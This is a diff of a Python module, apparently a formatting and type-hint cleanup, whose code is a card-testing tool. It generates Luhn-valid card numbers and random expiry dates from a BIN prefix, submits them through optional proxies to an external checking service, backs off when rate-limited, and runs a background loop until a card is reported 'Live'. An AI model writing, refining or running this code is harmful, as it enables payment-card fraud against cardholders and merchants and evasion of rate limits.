@@ -8,7 +8,8 @@ import random
 import re
 import threading
 import time
-from typing import Optional, Callable
+from collections.abc import Callable
+
 import requests
 
 logger = logging.getLogger(__name__)
@@ -38,13 +39,13 @@ def luhn_complete(partial: str) -> str:
 def generate_card_number(bin_prefix: str) -> str:
     """Generate a valid card number from BIN prefix."""
     prefix = bin_prefix.lower().replace('x', '').replace('X', '')
-    
+
     # Determine card length
     if re.match(r'^3[47]', prefix):
         total_digits = 15
     else:
         total_digits = 16
-    
+
     missing = total_digits - 1 - len(prefix)
     middle = ''.join(str(random.randint(0, 9)) for _ in range(missing))
     return luhn_complete(prefix + middle)
@@ -72,13 +73,13 @@ def check_card(card_data: str, timeout: int = 15, proxy: str | None = None) -> d
             timeout=timeout,
             proxies={"http": proxy, "https": proxy} if proxy else None,
         )
-        
+
         if response.status_code == 429:
             return {'status': 'RateLimited', 'message': 'Too many requests'}
-        
+
         if response.status_code != 200:
             return {'status': 'Error', 'message': f'HTTP {response.status_code}'}
-        
+
         data = response.json()
         return {
             'status': data.get('status', 'Unknown'),
@@ -90,7 +91,7 @@ def check_card(card_data: str, timeout: int = 15, proxy: str | None = None) -> d
         return {'status': 'Error', 'message': str(e)}
 
 
-def generate_card_from_bin(bin_prefix: str, month: Optional[str] = None, year: Optional[str] = None) -> str:
+def generate_card_from_bin(bin_prefix: str, month: str | None = None, year: str | None = None) -> str:
     """Generate a complete card string from BIN."""
     card_number = generate_card_number(bin_prefix)
     card_month = month or f"{random.randint(1, 12):02d}"
@@ -101,86 +102,86 @@ def generate_card_from_bin(bin_prefix: str, month: Optional[str] = None, year: O
 
 class LiveCardFinder:
     """Background card finder — generates and checks cards until Live found."""
-    
+
     def __init__(self, bin_prefix: str, max_attempts: int = 100, proxy: str | None = None):
         self.bin_prefix = bin_prefix
         self.max_attempts = max_attempts
         self.proxy = proxy
-        self.live_card: Optional[str] = None
+        self.live_card: str | None = None
         self.attempts = 0
         self._stop_event = threading.Event()
-        self._thread: Optional[threading.Thread] = None
-    
-    def start(self, callback: Optional[Callable[[str, dict], None]] = None):
+        self._thread: threading.Thread | None = None
+
+    def start(self, callback: Callable[[str, dict], None] | None = None):
         """Start background search."""
         self._thread = threading.Thread(target=self._search, args=(callback,), daemon=True)
         self._thread.start()
         logger.info(f"[LiveCardFinder] Started search for BIN {self.bin_prefix}")
-    
-    def _search(self, callback: Optional[Callable[[str, dict], None]] = None):
+
+    def _search(self, callback: Callable[[str, dict], None] | None = None):
         """Internal search loop."""
         for attempt in range(self.max_attempts):
             if self._stop_event.is_set():
                 break
-            
+
             self.attempts = attempt + 1
             card_data = generate_card_from_bin(self.bin_prefix)
-            
+
             logger.debug(f"[LiveCardFinder] Checking card {attempt + 1}/{self.max_attempts}")
             result = check_card(card_data, proxy=self.proxy)
-            
+
             if callback:
                 callback(card_data, result)
-            
+
             if result['status'] == 'Live':
                 self.live_card = card_data
                 logger.info(f"[LiveCardFinder] LIVE card found after {attempt + 1} attempts: {card_data[:6]}...{card_data[-4:]}")
                 return
-            
+
             if result['status'] == 'RateLimited':
                 logger.warning("[LiveCardFinder] Rate limited, waiting 10s...")
                 time.sleep(10)
             else:
                 time.sleep(0.5)  # Small delay between checks
-        
+
         logger.warning(f"[LiveCardFinder] No Live card found after {self.max_attempts} attempts")
-    
+
     def stop(self):
         """Stop the search."""
         self._stop_event.set()
-    
-    def wait(self, timeout: Optional[float] = None) -> Optional[str]:
+
+    def wait(self, timeout: float | None = None) -> str | None:
         """Wait for Live card. Returns None if timeout."""
         if self._thread and self._thread.is_alive():
             self._thread.join(timeout=timeout)
         return self.live_card
-    
+
     def is_running(self) -> bool:
         """Check if search is still running."""
         return self._thread is not None and self._thread.is_alive()
 
 
 # Global finder instance
-_current_finder: Optional[LiveCardFinder] = None
+_current_finder: LiveCardFinder | None = None
 
 
-def start_live_card_search(bin_prefix: str, max_attempts: int = 100, 
-                           callback: Optional[Callable[[str, dict], None]] = None,
+def start_live_card_search(bin_prefix: str, max_attempts: int = 100,
+                           callback: Callable[[str, dict], None] | None = None,
                            proxy: str | None = None) -> LiveCardFinder:
     """Start background search for Live card."""
     global _current_finder
-    
+
     # Stop previous if running
     if _current_finder and _current_finder.is_running():
         _current_finder.stop()
         _current_finder.wait(timeout=2)
-    
+
     _current_finder = LiveCardFinder(bin_prefix, max_attempts, proxy=proxy)
     _current_finder.start(callback)
     return _current_finder
 
 
-def get_live_card(timeout: float = 60) -> Optional[str]:
+def get_live_card(timeout: float = 60) -> str | None:
     """Get Live card, waiting if necessary."""
     if _current_finder is None:
         return None
@@ -191,7 +192,7 @@ def get_finder_status() -> dict:
     """Get current finder status."""
     if _current_finder is None:
         return {'running': False, 'attempts': 0, 'live_card': None}
-    
+
     return {
         'running': _current_finder.is_running(),
         'attempts': _current_finder.attempts,
